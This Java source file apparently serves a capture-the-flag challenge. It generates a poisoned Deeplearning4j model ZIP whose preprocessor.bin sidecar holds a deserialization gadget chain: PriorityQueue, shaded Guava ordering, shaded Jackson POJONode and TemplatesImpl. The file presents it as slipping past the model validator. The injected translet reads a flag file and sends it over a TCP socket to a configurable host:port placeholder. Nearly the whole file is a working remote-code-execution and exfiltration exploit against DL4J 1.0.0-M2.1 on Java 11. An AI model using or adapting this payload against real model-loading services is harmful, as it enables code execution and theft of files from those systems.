package local.poc;

import javassist.*;
import org.deeplearning4j.nn.conf.MultiLayerConfiguration;
import org.deeplearning4j.nn.conf.NeuralNetConfiguration;
import org.deeplearning4j.nn.conf.layers.OutputLayer;
import org.deeplearning4j.nn.multilayer.MultiLayerNetwork;
import org.deeplearning4j.util.ModelSerializer;
import org.nd4j.linalg.activations.Activation;
import org.nd4j.linalg.lossfunctions.LossFunctions;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;

/**
 * Builds a DL4J model ZIP with a serialized gadget in `preprocessor.bin`.
 *
 * DL4JModelValidator ignores the sidecar. ModelSerializer later reads it through
 * ObjectInputStream. PriorityQueue invokes shaded Guava's UsingToStringOrdering,
 * which calls POJONode.toString(). Shaded Jackson then reaches
 * TemplatesImpl.newTransformer() and initializes the translet.
 *
 * Javassist removes BaseJsonNode.writeReplace() before Jackson loads so POJONode
 * serializes directly. Javassist is required only while building the payload.
 *
 * The target is DL4J 1.0.0-M2.1 on Java 11. The serialized graph contains shaded
 * Guava, shaded Jackson, and JDK classes available in the registry.
 *
 * Args:
 *   [0] output model zip   (default: model-rce.zip)
 *   [1] flag source path   (default: /flag.txt)
 *   [2] standalone blob out (default: <model>.preprocessor.bin): the raw serialized
 *       sidecar retained for inspection and gadget testing.
 *
 * The translet exfiltrates the flag over a TCP socket to a 48-byte host:port
 * placeholder (EXFIL_PLACEHOLDER) that the official solver overwrites in-place
 * (same length) at solve time, so retargeting needs no Java toolchain.
 */
public class SignetryPayload {

    public static void main(String[] args) throws Exception {
        String modelPath = args.length > 0 ? args[0] : "model-rce.zip";
        String flagSrc   = args.length > 1 ? args[1] : "/flag.txt";
        String blobPath  = args.length > 2 ? args[2] : modelPath + ".preprocessor.bin";

        Path modelFile = Path.of(modelPath).toAbsolutePath();
        Files.createDirectories(modelFile.getParent());
        Files.deleteIfExists(modelFile);

        System.out.println("[payload] flag=" + flagSrc + " -> exfil placeholder=" + EXFIL_PLACEHOLDER);

        // Strip BaseJsonNode.writeReplace() before any Jackson class loads.
        System.out.println("[payload] patching shaded BaseJsonNode (remove writeReplace)...");
        removeWriteReplace();

        // Build TemplatesImpl with the translet bytecode.
        System.out.println("[payload] building TemplatesImpl translet...");
        Object templates = createTemplatesImpl(flagSrc);

        // Wrap TemplatesImpl in the shaded POJONode after applying the patch.
        Object pojoNode = Class.forName("org.nd4j.shade.jackson.databind.node.POJONode")
                .getDeclaredConstructor(Object.class).newInstance(templates);

        // Use the shaded Guava ordering as the PriorityQueue comparator.
        Class<?> utoClass = Class.forName("org.nd4j.shade.guava.collect.UsingToStringOrdering");
        Field instanceField = utoClass.getDeclaredField("INSTANCE");
        instanceField.setAccessible(true);
        @SuppressWarnings("unchecked")
        Comparator<Object> toStringOrdering = (Comparator<Object>) instanceField.get(null);

        PriorityQueue<Object> queue = new PriorityQueue<>(2, toStringOrdering);
        queue.add("dummy1");
        queue.add("dummy2");
        // Replace the heap entries after add() to avoid triggering the gadget here.
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArr = (Object[]) queueField.get(queue);
        queueArr[0] = pojoNode;
        queueArr[1] = pojoNode;

        System.out.println("[payload] serializing PriorityQueue/UsingToStringOrdering/POJONode chain...");
        byte[] payload = serialize(queue);
        System.out.println("[payload] payload size=" + payload.length);

        // Write the standalone gadget blob for inspection and sidecar tests.
        Path blobFile = Path.of(blobPath).toAbsolutePath();
        Files.createDirectories(blobFile.getParent());
        Files.write(blobFile, payload);
        System.out.println("[payload] wrote blob " + blobFile);

        // Write the complete poisoned model used by the solver and local gadget test.
        writeBenignModel(modelFile);
        injectPreprocessorSidecar(modelFile, payload);

        System.out.println("[payload] wrote " + modelFile);
        System.out.println("[payload] done");
    }

    /**
     * Remove writeReplace() from the shaded BaseJsonNode so POJONode serializes
     * directly. This must run before any Jackson class loads.
     */
    private static void removeWriteReplace() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ct = pool.get("org.nd4j.shade.jackson.databind.node.BaseJsonNode");
        try {
            ct.removeMethod(ct.getDeclaredMethod("writeReplace"));
        } catch (NotFoundException e) {
            return;
        }
        ct.toClass(Thread.currentThread().getContextClassLoader(), null);
    }

    private static Object createTemplatesImpl(String flagSrc) throws Exception {
        byte[] classBytes = generateTransletBytecode(flagSrc);

        Class<?> templatesClass = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = templatesClass.getDeclaredConstructor().newInstance();

        setField(templates, "_bytecodes", new byte[][]{classBytes});
        setField(templates, "_name", "Signetry");
        setField(templates, "_tfactory",
                Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl")
                        .getDeclaredConstructor().newInstance());
        setField(templates, "_sdom", new ThreadLocal<>());
        return templates;
    }

    /**
     * Fixed-length (48-byte) callback placeholder. The official solver overwrites these
     * exact bytes in the serialized blob with the real "host:port" (padded back to 48)
     * before staging, so retargeting the exfil needs no Java toolchain at solve time.
     */
    static final String EXFIL_PLACEHOLDER =
            "@@SIGEXFIL@@127.0.0.1:09001@@@@@@@@@@@@@@@@@@@@@";

    /**
     * Translet whose constructor reads the flag and sends it to the configured TCP
     * listener. The registry's `/files` endpoint is not exposed at the Apache edge.
     */
    private static byte[] generateTransletBytecode(String flagSrc) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(
                Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")));

        CtClass clazz = pool.makeClass("local.poc.SignetTranslet" + System.nanoTime());
        clazz.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        String body = "{"
                + "try { java.io.FileOutputStream m = new java.io.FileOutputStream(\"/tmp/.sig_ran\");"
                + " m.write(\"SIGNETRY_CTOR_RAN\".getBytes()); m.close(); } catch (java.lang.Throwable e1) {}"
                + "try {"
                + " String tg = \"" + EXFIL_PLACEHOLDER + "\";"
                + " tg = tg.substring(12);"
                + " int z = tg.indexOf(\"@@\");"
                + " if (z >= 0) { tg = tg.substring(0, z); }"
                + " int ci = tg.lastIndexOf(\":\");"
                + " String h = tg.substring(0, ci);"
                + " int pn = Integer.parseInt(tg.substring(ci + 1));"
                + " java.io.File ff = new java.io.File(\"" + esc(flagSrc) + "\");"
                + " byte[] fb = new byte[(int) ff.length()];"
                + " java.io.FileInputStream fis = new java.io.FileInputStream(ff);"
                + " fis.read(fb); fis.close();"
                + " java.net.Socket sk = new java.net.Socket(h, pn);"
                + " java.io.OutputStream os = sk.getOutputStream();"
                + " os.write(fb); os.flush(); sk.close();"
                + "} catch (java.lang.Throwable e2) {}"
                + "}";

        CtConstructor ctor = new CtConstructor(new CtClass[0], clazz);
        ctor.setBody(body);
        clazz.addConstructor(ctor);

        clazz.addMethod(CtNewMethod.make(
                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, "
                        + "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) "
                        + "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));
        clazz.addMethod(CtNewMethod.make(
                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, "
                        + "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i, "
                        + "com.sun.org.apache.xml.internal.serializer.SerializationHandler h) "
                        + "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));

        byte[] bytecode = clazz.toBytecode();
        clazz.detach();
        return bytecode;
    }

    private static String esc(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static void writeBenignModel(Path modelFile) throws IOException {
        MultiLayerConfiguration conf = new NeuralNetConfiguration.Builder()
                .list()
                .layer(new OutputLayer.Builder(LossFunctions.LossFunction.MSE)
                        .nIn(1).nOut(1).activation(Activation.IDENTITY).build())
                .build();
        MultiLayerNetwork net = new MultiLayerNetwork(conf);
        net.init();
        ModelSerializer.writeModel(net, modelFile.toFile(), false);
    }

    private static void injectPreprocessorSidecar(Path modelFile, byte[] payload) throws Exception {
        Path tempFile = modelFile.resolveSibling(modelFile.getFileName() + ".tmp");
        Files.deleteIfExists(tempFile);
        try (ZipFile source = new ZipFile(modelFile.toFile());
             ZipOutputStream out = new ZipOutputStream(Files.newOutputStream(tempFile))) {
            Enumeration<? extends ZipEntry> entries = source.entries();
            while (entries.hasMoreElements()) {
                ZipEntry e = entries.nextElement();
                out.putNextEntry(new ZipEntry(e.getName()));
                source.getInputStream(e).transferTo(out);
                out.closeEntry();
            }
            ZipEntry pp = new ZipEntry(ModelSerializer.PREPROCESSOR_BIN);
            pp.setSize(payload.length);
            out.putNextEntry(pp);
            out.write(payload);
            out.closeEntry();
        }
        Files.move(tempFile, modelFile, StandardCopyOption.REPLACE_EXISTING);
    }

    private static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    private static byte[] serialize(Serializable object) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(object);
            oos.flush();
        }
        return baos.toByteArray();
    }
}
